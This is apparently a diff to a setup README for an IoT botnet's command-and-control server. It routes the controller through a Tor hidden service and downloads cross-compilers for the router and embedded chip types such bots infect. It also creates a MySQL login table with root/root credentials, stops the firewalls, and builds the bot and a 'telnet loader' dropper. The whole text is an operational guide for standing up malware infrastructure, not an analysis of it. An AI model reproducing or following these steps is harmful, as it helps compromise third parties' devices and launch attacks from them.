@@ -1,7 +1,7 @@
-Setting up the cnc
+// using ubuntu 20.04 for install
 
 1: install needed stuff
-sudo apt-get install libmysqlclient-dev tor -y
+sudo apt-get install apache2 mariadb-server libmysqlclient-dev tor -y
 
 2: edit tor config
 nano /etc/tor/torrc
@@ -30,3 +30,66 @@ rbhfryuog5fvbasyo3rwqnf4gwrupell7o7ikydb4zdl4v6e2oozfkid.onion
 save the full folder /var/lib/tor/hidden_service/ (all its contents) so that
 if your cnc box goes down you can reuse the same hidden service on an other
 vps (like domain)
+
+--- Download requirements ---
+
+mkdir /etc/xcompile
+cd /etc/xcompile
+
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-armv5l.tar.bz2
+tar -jxf cross-compiler-armv6l.tar.bz2
+tar -jxf cross-compiler-armv7l.tar.bz2
+tar -jxf cross-compiler-x86_64.tar.bz2
+rm -rf *.tar.bz2
+rm -rf *.tar.gz
+mv cross-compiler-i586 i586
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv6l armv6l
+mv cross-compiler-armv7l armv7l
+mv cross-compiler-x86_64 x86_64
+
+
+--- Config mysql ---
+service mariadb restart
+mysql_secure_installation (step for change new password)
+mysql -u root -pYOURMYSQLPASS
+create database `cnc`;
+
+use cnc;
+
+CREATE TABLE `users` (
+    `username` varchar(32) NOT NULL,
+    `password` varchar(32) NOT NULL,
+    KEY `username` (`username`)
+);
+
+INSERT INTO users(username, password) VALUES('root', 'root');
+exit;
+
+Done. go to cnc/admin.c and config your mysql login information
+
+--- Build ---
+service firewalld stop
+service iptables stop
+service mariadb restart
+service tor restart
+service apache2 restart
+
+bash build.sh
+
+// build telnet loader
+bash dropper.sh
